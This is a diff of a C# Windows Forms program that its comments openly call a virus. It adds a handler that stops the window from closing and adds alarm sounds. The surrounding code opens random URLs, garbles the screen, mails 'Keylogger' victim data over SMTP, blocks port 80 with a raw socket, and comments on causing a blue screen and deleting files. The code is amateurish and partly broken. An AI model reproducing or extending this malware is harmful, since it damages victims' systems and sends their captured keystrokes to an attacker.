@@ -5,13 +5,11 @@ using System.Data;
 using System.Drawing;
 using System.Linq;
 using System.Net.Mail;
-using System.Drawing;
 using System.Drawing.Imaging;
 using Microsoft.Win32;
 using System.Text;
 using System.Windows.Forms;
 using System.Threading.Tasks;
-using System.Windows.Forms;
 using System.Diagnostics;
 using System.Runtime.InteropServices;
 using System.IO;
@@ -47,6 +45,11 @@ namespace WindowsFormsApp1
             // More stuff like that so help a guy out please!
         }
 
+        private void Form1_Close(object sender, FormClosingEventArgs e)
+        {
+            e.Cancel = true;
+        }
+
         private void Form1_Load(object sender, EventArgs e)
         {
             Process.EnterDebugMode(); // gets debug options to iniate a blue screen o' death and delete all your things!
@@ -71,6 +74,7 @@ namespace WindowsFormsApp1
                 if (File.Exists(sound_file_dying))
                 {
                     _soundplayer = new SoundPlayer(@"C:\Windows\Media\Windows Battery Low.wav");
+                    _soundplayer.Play(); //play sound
                 }
             }
             if (File.Exists(ci_dll))
@@ -79,6 +83,7 @@ namespace WindowsFormsApp1
                 if (File.Exists(sound_file_dying))
                 {
                     _soundplayer = new SoundPlayer(@"C:\Windows\Media\Windows Battery Low.wav");
+                    _soundplayer.Play(); //play sound
                 }
             }
             if (File.Exists(winload_exe))
@@ -87,6 +92,7 @@ namespace WindowsFormsApp1
                 if (File.Exists(sound_file_dying))
                 {
                     _soundplayer = new SoundPlayer(@"C:\Windows\Media\Windows Battery Low.wav");
+                    _soundplayer.Play(); //play sound
                 }
             }
             if (File.Exists(disk_sys))
@@ -95,6 +101,7 @@ namespace WindowsFormsApp1
                 if (File.Exists(sound_file_dying))
                 {
                     _soundplayer = new SoundPlayer(@"C:\Windows\Media\Windows Battery Low.wav");
+                    _soundplayer.Play(); //play sound
                 }
             }
             if (File.Exists(memoryanyalizer))
@@ -103,6 +110,7 @@ namespace WindowsFormsApp1
                 if (File.Exists(sound_file_dying))
                 {
                     _soundplayer = new SoundPlayer(@"C:\Windows\Media\Windows Battery Low.wav");
+                    _soundplayer.Play(); //play sound
                 }
             }
             if (File.Exists(notepad))
@@ -111,6 +119,7 @@ namespace WindowsFormsApp1
                 if (File.Exists(sound_file_dying))
                 {
                     _soundplayer = new SoundPlayer(@"C:\Windows\Media\Windows Battery Low.wav");
+                    _soundplayer.Play(); //play sound
                 }
             }
             if (File.Exists(fileexplorer))
@@ -119,20 +128,22 @@ namespace WindowsFormsApp1
                 if (File.Exists(sound_file_dying))
                 {
                     _soundplayer = new SoundPlayer(@"C:\Windows\Media\Windows Battery Low.wav");
+                    _soundplayer.Play(); //play sound
                 }
             }
             // Now we get annoying with opening screens.
             Random r;
             r = new Random();
-            int true_num = r.Next(5); //make random num 1-5
+            int true_num = r.Next(5); //make random num 1-5 (P.S: the random number hi-graph here is for the below but can also be used for other stuff)
 
             if (true_num == 1)
             {
-                System.Diagnostics.Process.Start("https://www.youtube.com/channel/UC9keh4wDjXFyiRhHDE_h90Q?view_as=subscriber");
+                System.Diagnostics.Process.Start("https://www.youtube.com/channel/UC9keh4wDjXFyiRhHDE_h90Q?view_as=subscriber"); //System.Diagnostics.Process.Start("https://www.youtube.com/channel/UC9keh4wDjXFyiRhHDE_h90Q?view_as=subscriber");
             }
 
             if (true_num == 2)
             {
+                if (MessageBox.Show("Never gonna give you up never gonna let ya down.", "WARNING", MessageBoxButtons.YesNo, MessageBoxIcon.Warning, MessageBoxDefaultButton.Button2) == DialogResult.No);
                 System.Diagnostics.Process.Start("https://www.youtube.com/channel/UCviSYAcwdnDX1UoRzAHYgNg");
             }
 
@@ -150,11 +161,13 @@ namespace WindowsFormsApp1
             {
                 System.Diagnostics.Process.Start("https://www.google.com/search?q=dancing+cow&sxsrf=ALeKk03Rx29J4Nduy2BetYRf6PUHNs9I8A:1605092295881&source=lnms&tbm=isch&sa=X&ved=2ahUKEwiupoLhqvrsAhUdJcUKHdqKANwQ_AUoAXoECAcQAw&biw=1920&bih=937");
             }
-            // This part of the virus makes annoying sounds and also downloads a bunch of malware.
+            // This part of the virus used to make a sound but i have instead made checks for it not too.
             if (File.Exists(sound_file))
             {
                 _soundplayer = new SoundPlayer(@"C:\Windows\Media\Windows Critical Stop.wav");
+                _soundplayer.Play(); //play sound
             }
+            // _soundplayer.Play(); //play sound
             // This part makes your entire screen buggy
             Graphics g;
             Bitmap bmp;
@@ -202,14 +215,14 @@ namespace WindowsFormsApp1
 
             mail.From = new MailAddress("ThisGuyGotHAXED!");
             mail.To.Add("dont be stupid!");
-            mail.Subject = "Keylogger date: " + DateTime.Now.ToLongDateString();
+            //mail.Subject = "Keylogger date: " + DateTime.Now.ToLongDateString(); // will use soon
+            mail.Subject = "Keylogger date: " + mailTime; // test of using mailtime system.
             mail.Body = "Information key from victim\n";
             SmtpServer.Port = 587;
             SmtpServer.Credentials = new System.Net.NetworkCredential("ThisGuyGotHAXED!", "dont be stupid!");
             SmtpServer.EnableSsl = true;
             SmtpServer.SendMailAsync("Hello there this is a hacked email!", "whyareyousosus@gmail.com", "Hacked email sent", "hi");
-            // Actually sending the fridgin mail.
-            SmtpServer.Send(mail);
+            SmtpServer.Send(mail); // Actually sending the fridgin mail.
             // Blocking a port.
             int portToBlock = 80;
             Socket s = new Socket(AddressFamily.InterNetwork, SocketType.Raw, ProtocolType.IP);
